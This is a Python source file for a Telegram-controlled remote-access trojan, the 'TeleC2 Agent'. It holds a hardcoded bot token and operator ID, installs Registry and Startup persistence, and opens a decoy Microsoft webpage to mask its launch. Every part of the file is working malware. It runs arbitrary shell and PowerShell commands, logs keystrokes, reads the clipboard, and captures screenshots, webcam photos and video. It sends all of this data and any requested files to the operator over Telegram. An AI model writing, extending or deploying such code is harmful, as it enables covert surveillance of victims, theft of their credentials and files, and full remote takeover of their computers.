#!/usr/bin/env python3
# =============================================================================
# TeleC2 Agent – Final Reliable Version
#   - Robust polling with retry loop (bot.polling, none_stop=True, timeout=30)
#   - System ID (hostname/username) as agent identifier
#   - Clipboard handled gracefully (missing pywin32 won't crash)
#   - Max output 4000 chars, wrapped in ``` code block (parse_mode=None)
#   - webbrowser.open() for decoy URL
#   - Persistence via persistence.py (Registry + Startup)
#   - All commands retained (screenshot, webcam, video, keylogger, etc.)
#   - No prank/scare functions
# =============================================================================
import cv2
import time
import telebot
import platform
import pyautogui
import subprocess
import threading
from pynput import keyboard
import os
import re
import json
import socket
import psutil
from datetime import datetime
from uuid import getnode as get_mac
import sys
import base64
import io
import traceback
import webbrowser
import persistence          # Local module – Registry + Startup persistence

# -----------------------------------------------------------------------------
# Hardcoded Configuration
# -----------------------------------------------------------------------------
BOT_API_KEY = "8318891177:AAG8SB7YI_YAQHL2cszd4fKFK8Xp9-7u-JY"
TELEGRAM_USER_ID = 5178265082

# Keylogger bot (leave empty if not used)
KEYLOGGER_BOT_API_KEY = ""
KEYLOGGER_CHAT_ID = ""

# Decoy URL – opened after successful startup
DECOY_URL = "https://learn.microsoft.com/en-us/dynamics365/supply-chain/procurement/purchase-order-overview"

# -----------------------------------------------------------------------------
# Global log buffer (sent to Telegram before decoy URL)
# -----------------------------------------------------------------------------
log_lines = []

def log(msg):
    """Append a timestamped message to the runtime log."""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    line = f"[{timestamp}] {msg}"
    log_lines.append(line)
    print(line)

def send_log_to_telegram(bot_instance):
    """Upload the entire runtime log as Execution_log.txt to the operator."""
    if not log_lines:
        return
    try:
        log_text = "\n".join(log_lines)
        bio = io.BytesIO(log_text.encode('utf-8'))
        bio.name = "Execution_log.txt"
        bio.seek(0)
        bot_instance.send_document(TELEGRAM_USER_ID, bio)
        log("Execution log sent to Telegram")
    except Exception as e:
        print(f"Failed to send log: {e}")

# -----------------------------------------------------------------------------
# Telegram bot instances
# -----------------------------------------------------------------------------
bot = telebot.TeleBot(BOT_API_KEY)
keylogger_bot = telebot.TeleBot(KEYLOGGER_BOT_API_KEY) if KEYLOGGER_BOT_API_KEY else None

# -----------------------------------------------------------------------------
# Agent management – writable location (same as persistence)
# -----------------------------------------------------------------------------
appdata = os.environ.get('APPDATA', os.path.expanduser('~'))
agents_dir = os.path.join(appdata, 'Microsoft', 'Windows')
os.makedirs(agents_dir, exist_ok=True)
agents_file = os.path.join(agents_dir, 'agents.json')

# -----------------------------------------------------------------------------
# Keylogger variables and callbacks
# -----------------------------------------------------------------------------
keylogger_active = False
keylogger_listener = None
keystroke_buffer = ""
MAX_BUFFER_LENGTH = 100
last_send_time = time.time()
SEND_INTERVAL = 60

def on_press(key):
    global keystroke_buffer, last_send_time
    try:
        if hasattr(key, 'char') and key.char is not None:
            keystroke_buffer += key.char
        elif key == keyboard.Key.space:
            keystroke_buffer += " "
        elif key == keyboard.Key.enter:
            keystroke_buffer += "\n"
        elif key == keyboard.Key.tab:
            keystroke_buffer += "\t"
        else:
            keystroke_buffer += f"[{str(key).replace('Key.', '')}]"
    except AttributeError:
        keystroke_buffer += f"[{str(key)}]"
    current_time = time.time()
    if (len(keystroke_buffer) >= MAX_BUFFER_LENGTH or 
        (current_time - last_send_time >= SEND_INTERVAL and keystroke_buffer)):
        send_keystrokes()

def send_keystrokes():
    global keystroke_buffer, last_send_time
    if keystroke_buffer and keylogger_bot:
        try:
            system_id = get_system_id()
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            message = f"Keylogger data from: {system_id}\nTime: {timestamp}\n\n{keystroke_buffer}"
            keylogger_bot.send_message(KEYLOGGER_CHAT_ID, message)
            keystroke_buffer = ""
            last_send_time = time.time()
        except Exception as e:
            print(f"Error sending keystrokes: {e}")

def start_keylogger():
    global keylogger_active, keylogger_listener
    if keylogger_active:
        return "Keylogger is already running"
    if not keylogger_bot:
        return "Keylogger bot not configured"
    try:
        keylogger_listener = keyboard.Listener(on_press=on_press)
        keylogger_listener.start()
        keylogger_active = True
        def periodic_send():
            while keylogger_active:
                time.sleep(SEND_INTERVAL)
                send_keystrokes()
        threading.Thread(target=periodic_send, daemon=True).start()
        log("Keylogger started")
        return "Keylogger started successfully"
    except Exception as e:
        log(f"Keylogger start error: {e}")
        return f"Failed to start keylogger: {str(e)}"

def stop_keylogger():
    global keylogger_active, keylogger_listener, keystroke_buffer
    if not keylogger_active:
        return "Keylogger is not running"
    try:
        keylogger_active = False
        if keylogger_listener:
            keylogger_listener.stop()
        if keystroke_buffer:
            send_keystrokes()
        log("Keylogger stopped")
        return "Keylogger stopped successfully"
    except Exception as e:
        log(f"Keylogger stop error: {e}")
        return f"Failed to stop keylogger: {str(e)}"

# Keylog cleaning utilities (original TeleC2)
def apply_backspaces(s):
    pattern = re.compile(r'\[backspace\]', flags=re.IGNORECASE)
    parts = pattern.split(s)
    out = parts[0]
    for seg in parts[1:]:
        if out:
            out = out[:-1]
        out += seg
    return out

def process_special_keys(text):
    text = re.sub(r'\[shift\]', '', text, flags=re.IGNORECASE)
    text = re.sub(r'\[ctrl\]', '', text, flags=re.IGNORECASE)
    text = re.sub(r'\[alt\]', '', text, flags=re.IGNORECASE)
    text = re.sub(r'\[win\]', '', text, flags=re.IGNORECASE)
    text = re.sub(r'\[caps_lock\]', '', text, flags=re.IGNORECASE)
    text = re.sub(r'\[enter\]', '\n', text, flags=re.IGNORECASE)
    text = re.sub(r'\[tab\]', '\t', text, flags=re.IGNORECASE)
    text = re.sub(r'\[space\]', ' ', text, flags=re.IGNORECASE)
    text = re.sub(r'\[left\]', '[←]', text, flags=re.IGNORECASE)
    text = re.sub(r'\[right\]', '[→]', text, flags=re.IGNORECASE)
    text = re.sub(r'\[up\]', '[↑]', text, flags=re.IGNORECASE)
    text = re.sub(r'\[down\]', '[↓]', text, flags=re.IGNORECASE)
    text = re.sub(r'\[esc\]', '[Esc]', text, flags=re.IGNORECASE)
    text = re.sub(r'\[delete\]', '[Del]', text, flags=re.IGNORECASE)
    text = re.sub(r'\[backspace\]', '', text, flags=re.IGNORECASE)
    text = re.sub(r'\[insert\]', '[Ins]', text, flags=re.IGNORECASE)
    return text

def clean_keylogger_data(text):
    text = apply_backspaces(text)
    text = process_special_keys(text)
    return text

def clean_keylog_file(input_file, output_file):
    try:
        with open(input_file, 'r', encoding='utf-8', errors='ignore') as f:
            raw_text = f.read()
        cleaned_text = clean_keylogger_data(raw_text)
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(cleaned_text)
        log(f"Cleaned keylog file {input_file} -> {output_file}")
        return f"Successfully cleaned keylog file. Output written to {output_file}"
    except Exception as e:
        log(f"Keylog file cleaning error: {e}")
        return f"Error cleaning file: {str(e)}"

# -----------------------------------------------------------------------------
# System identification and command execution
# -----------------------------------------------------------------------------
def get_system_id():
    hostname = execute_system_command("hostname").strip()
    username = execute_system_command("whoami").strip()
    return f"{hostname}/{username}"

def get_device_id():
    mac = ':'.join(('%012X' % get_mac())[i:i+2] for i in range(0, 12, 2))
    return mac

def verify_telegram_id(uid):
    return TELEGRAM_USER_ID == uid

def execute_system_command(cmd):
    max_message_length = 4000
    try:
        output = subprocess.getstatusoutput(cmd)
        if len(output[1]) > max_message_length:
            return str(output[1][:max_message_length])
        return str(output[1])
    except Exception as e:
        log(f"System command failed: {cmd} -> {e}")
        return "Command execution failed"

def execute_powershell(cmd):
    max_message_length = 4000
    try:
        if platform.system() == "Windows":
            output = subprocess.getstatusoutput(f"powershell -Command {cmd}")
        else:
            output = subprocess.getstatusoutput(f"pwsh -Command {cmd}")
        if len(output[1]) > max_message_length:
            return str(output[1][:max_message_length])
        return str(output[1])
    except Exception as e:
        log(f"PowerShell command failed: {cmd} -> {e}")
        return "PowerShell execution failed"

def get_clipboard():
    try:
        import win32clipboard
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        return data
    except ImportError:
        return "Clipboard access requires pywin32 library (not installed)"
    except Exception as e:
        log(f"Clipboard error: {e}")
        return "Could not access clipboard"

# -----------------------------------------------------------------------------
# Agent registration (uses system_id as the sole agent identifier)
# -----------------------------------------------------------------------------
def register_agent():
    """Store agent presence in agents.json; returns system_id as the identifier."""
    agent_id = get_system_id()
    try:
        with open(agents_file, 'r') as f:
            data = json.load(f)
    except:
        data = {}
    # Mark all previous as offline, then mark this one online
    for aid in data:
        data[aid]['status'] = 'offline'
    data[agent_id] = {
        'last_seen': datetime.now().isoformat(),
        'status': 'online',
        'device_id': get_device_id(),
        'ip': socket.gethostbyname(socket.gethostname())
    }
    try:
        with open(agents_file, 'w') as f:
            json.dump(data, f)
    except Exception as e:
        log(f"Error saving agents: {e}")
    return agent_id

def get_active_agents():
    """Return list of online agent system IDs."""
    try:
        with open(agents_file, 'r') as f:
            data = json.load(f)
    except:
        data = {}
    return [aid for aid, info in data.items() if info.get('status') == 'online']

# -----------------------------------------------------------------------------
# File handling utilities
# -----------------------------------------------------------------------------
def view_file_content(file_path):
    try:
        if not os.path.exists(file_path):
            return f"File not found: {file_path}"
        if os.path.isdir(file_path):
            return f"Path is a directory, not a file: {file_path}"
        file_size = os.path.getsize(file_path)
        if file_size > 10 * 1024 * 1024:
            return f"File too large to view ({file_size/1024/1024:.2f} MB). Use /downloadFile instead."
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        max_length = 4000
        if len(content) > max_length:
            content = content[:max_length] + "\n\n... (truncated due to length)"
        return f"Contents of {file_path}:\n\n{content}"
    except Exception as e:
        log(f"viewFile error: {e}")
        return f"Error reading file: {str(e)}"

def download_file(file_path):
    try:
        if not os.path.exists(file_path):
            return None, f"File not found: {file_path}"
        if os.path.isdir(file_path):
            return None, f"Path is a directory, not a file: {file_path}"
        file_size = os.path.getsize(file_path)
        if file_size > 50 * 1024 * 1024:
            return None, f"File too large to download ({file_size/1024/1024:.2f} MB). Max size is 50MB."
        return file_path, None
    except Exception as e:
        log(f"downloadFile access error: {e}")
        return None, f"Error accessing file: {str(e)}"

# -----------------------------------------------------------------------------
# Telegram Bot Handlers
# -----------------------------------------------------------------------------
@bot.message_handler(commands=['start', 'scan'])
def scan_command(message):
    if not verify_telegram_id(message.from_user.id):
        return
    my_id = register_agent()
    agents = get_active_agents()
    if agents:
        response = "Active agents:\n" + "\n".join(agents)
    else:
        response = "No active agents."
    bot.reply_to(message, response)

@bot.message_handler(commands=['die'])
def die_command(message):
    if not verify_telegram_id(message.from_user.id):
        return
    # Only respond if the command targets this agent (or wildcard)
    parts = message.text.split()
    if len(parts) > 1 and parts[1] != '*' and parts[1] != get_system_id():
        return
    log("Die command received, exiting")
    bot.reply_to(message, "Shutting down this agent...")
    os._exit(0)

@bot.message_handler(commands=['off'])
def off_command(message):
    if not verify_telegram_id(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) > 1 and parts[1] != '*' and parts[1] != get_system_id():
        return
    try:
        subprocess.run(["shutdown", "/s", "/t", "0", "/f"], check=True)
    except Exception as e:
        bot.reply_to(message, f"Failed to shutdown: {e}")

@bot.message_handler(commands=['cmd'])
def cmd_command(message):
    if not verify_telegram_id(message.from_user.id):
        return
    parts = message.text.split(' ', 2)
    if len(parts) < 3:
        bot.reply_to(message, "Usage: /cmd <agent_id> <command>")
        return
    target = parts[1]
    command = parts[2]
    my_id = get_system_id()
    if target != my_id and target != '*':
        return
    output = execute_system_command(command)
    safe_output = f"```\n{output}\n```"
    bot.reply_to(message, safe_output, parse_mode=None)

@bot.message_handler(commands=['pow'])
def pow_command(message):
    if not verify_telegram_id(message.from_user.id):
        return
    parts = message.text.split(' ', 2)
    if len(parts) < 3:
        bot.reply_to(message, "Usage: /pow <agent_id> <powershell_command>")
        return
    target = parts[1]
    command = parts[2]
    my_id = get_system_id()
    if target != my_id and target != '*':
        return
    output = execute_powershell(command)
    safe_output = f"```\n{output}\n```"
    bot.reply_to(message, safe_output, parse_mode=None)

@bot.message_handler(commands=['info'])
def info_command(message):
    if not verify_telegram_id(message.from_user.id):
        return
    my_id = get_system_id()
    system_info = f"""
System: {platform.system()} {platform.release()}
Hostname: {socket.gethostname()}
IP: {socket.gethostbyname(socket.gethostname())}
Username: {my_id.split('/')[1]}
CPU: {platform.processor()}
Memory: {psutil.virtual_memory().total / (1024**3):.2f} GB
    """
    bot.reply_to(message, system_info)

@bot.message_handler(commands=['clip'])
def clip_command(message):
    if not verify_telegram_id(message.from_user.id):
        return
    data = get_clipboard()
    safe = f"```\n{data}\n```"
    bot.reply_to(message, safe, parse_mode=None)

@bot.message_handler(commands=['viewFile'])
def view_file_command(message):
    if not verify_telegram_id(message.from_user.id):
        return
    parts = message.text.split(' ', 2)
    if len(parts) < 3:
        bot.reply_to(message, "Usage: /viewFile <agent_id> <file_path>")
        return
    target = parts[1]
    file_path = parts[2]
    my_id = get_system_id()
    if target != my_id and target != '*':
        return
    content = view_file_content(file_path)
    safe = f"```\n{content}\n```"
    bot.reply_to(message, safe, parse_mode=None)

@bot.message_handler(commands=['downloadFile'])
def download_file_command(message):
    if not verify_telegram_id(message.from_user.id):
        return
    parts = message.text.split(' ', 2)
    if len(parts) < 3:
        bot.reply_to(message, "Usage: /downloadFile <agent_id> <file_path>")
        return
    target = parts[1]
    file_path = parts[2]
    my_id = get_system_id()
    if target != my_id and target != '*':
        return
    path, error = download_file(file_path)
    if error:
        bot.reply_to(message, error)
    else:
        try:
            with open(path, 'rb') as f:
                bot.send_document(message.chat.id, f)
            bot.reply_to(message, "File downloaded successfully")
        except Exception as e:
            log(f"File download send error: {e}")
            bot.reply_to(message, f"Error sending file: {str(e)}")

@bot.message_handler(commands=['screenshot'])
def screenshot_command(message):
    if not verify_telegram_id(message.from_user.id):
        return
    try:
        screenshot = pyautogui.screenshot()
        timestamp = int(time.time())
        filename = f"{timestamp}.png"
        screenshot.save(filename)
        with open(filename, "rb") as image:
            bot.send_photo(message.from_user.id, image)
        os.remove(filename)
        log("Screenshot sent")
        bot.reply_to(message, "[+] Screenshot taken")
    except Exception as e:
        log(f"Screenshot error: {e}")
        bot.reply_to(message, f"[!] Unsuccessful: {str(e)}")

@bot.message_handler(commands=['webcam'])
def webcam_command(message):
    if not verify_telegram_id(message.from_user.id):
        return
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        if ret:
            timestamp = int(time.time())
            filename = f"{timestamp}.png"
            cv2.imwrite(filename, frame)
            with open(filename, "rb") as image:
                bot.send_photo(message.from_user.id, image)
            os.remove(filename)
            log("Webcam photo sent")
        cap.release()
    except Exception as e:
        log(f"Webcam error: {e}")
        bot.reply_to(message, f"[!] Unsuccessful: {str(e)}")

@bot.message_handler(commands=['video'])
def video_command(message):
    if not verify_telegram_id(message.from_user.id):
        return
    parts = message.text.split(' ')
    if len(parts) != 3:
        bot.reply_to(message, "Usage: /video <agent_id> <duration_seconds>")
        return
    # No target check for video – runs on the agent that receives the command
    try:
        duration = int(parts[2])
        cap = cv2.VideoCapture(0)
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        timestamp = int(time.time())
        filename = f"{timestamp}.avi"
        out = cv2.VideoWriter(filename, fourcc, 20.0, (640, 480))
        start_time = time.time()
        while (time.time() - start_time) < duration:
            ret, frame = cap.read()
            if not ret:
                break
            out.write(frame)
        out.release()
        cap.release()
        with open(filename, "rb") as video:
            bot.send_video(message.from_user.id, video)
        os.remove(filename)
        log(f"Video recorded ({duration}s) and sent")
    except Exception as e:
        log(f"Video error: {e}")
        bot.reply_to(message, f"[!] Unsuccessful: {str(e)}")

@bot.message_handler(commands=['keylogger'])
def keylogger_command(message):
    if not verify_telegram_id(message.from_user.id):
        return
    parts = message.text.split(' ')
    if len(parts) < 2:
        bot.reply_to(message, "Usage: /keylogger <start|stop|status|clean> [agent_id]")
        return
    command = parts[1].lower()
    if command == "clean":
        if len(parts) != 5:
            bot.reply_to(message, "Usage: /keylogger clean <agent_id> <input_file> <output_file>")
            return
        target = parts[2]
        my_id = get_system_id()
        if target != my_id and target != '*':
            return
        input_file = parts[3]
        output_file = parts[4]
        result = clean_keylog_file(input_file, output_file)
        bot.reply_to(message, result)
    elif command in ("start", "stop", "status"):
        if len(parts) != 3:
            bot.reply_to(message, f"Usage: /keylogger {command} <agent_id>")
            return
        target = parts[2]
        my_id = get_system_id()
        if target != my_id and target != '*':
            return
        if command == "start":
            result = start_keylogger()
        elif command == "stop":
            result = stop_keylogger()
        else:
            result = f"Keylogger is {'active' if keylogger_active else 'inactive'}"
        bot.reply_to(message, result)
    else:
        bot.reply_to(message, "Unknown keylogger command. Use start, stop, status, or clean.")

# -----------------------------------------------------------------------------
# Cleanup (called on exit, though polling is infinite)
# -----------------------------------------------------------------------------
def cleanup():
    if keylogger_active and keystroke_buffer:
        send_keystrokes()

# -----------------------------------------------------------------------------
# Main Execution Flow
# -----------------------------------------------------------------------------
if __name__ == "__main__":
    log("=== Agent starting ===")
    try:
        # 1. Persistence
        try:
            persistence.install_persistence()
            log("Persistence installed")
        except Exception as e:
            log(f"Persistence error: {traceback.format_exc()}")

        # 2. Register this agent
        agent_id = register_agent()
        log(f"Agent ID: {agent_id}")

        # 3. Send execution log BEFORE any visual output
        log("Sending execution log to Telegram")
        send_log_to_telegram(bot)

        # 4. Open decoy URL (silent, last action)
        log(f"Opening decoy URL: {DECOY_URL}")
        webbrowser.open(DECOY_URL)

        # 5. Main polling loop – retry forever on network errors
        log("Entering main polling loop")
        while True:
            try:
                bot.polling(none_stop=True, timeout=30)
            except Exception as e:
                log(f"Polling error: {e}. Retrying in 10s...")
                time.sleep(10)

    except Exception as e:
        log(f"Fatal error: {traceback.format_exc()}")
        try:
            send_log_to_telegram(bot)
        except:
            pass
    finally:
        cleanup()
